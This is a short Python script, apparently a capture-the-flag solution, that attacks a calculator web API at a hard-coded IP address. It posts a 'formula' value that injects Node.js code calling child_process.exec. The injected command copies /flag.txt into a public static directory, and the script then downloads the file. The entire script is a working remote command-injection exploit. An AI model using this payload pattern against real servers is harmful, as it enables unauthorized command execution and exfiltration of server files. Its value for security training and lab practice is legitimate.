import requests
from bs4 import BeautifulSoup as bs

url = "http://94.237.62.195:45843"
data = {"formula":"require(\"child_process\").exec(\"cat /flag.txt > /app/static/css/ok.txt\")"}

respond  = requests.post(f"{url}/api/calculate",json=data,headers={"Content-type":"Application/json"})
flag = requests.get(f"{url}/static/css/ok.txt")
print(flag.text.strip())
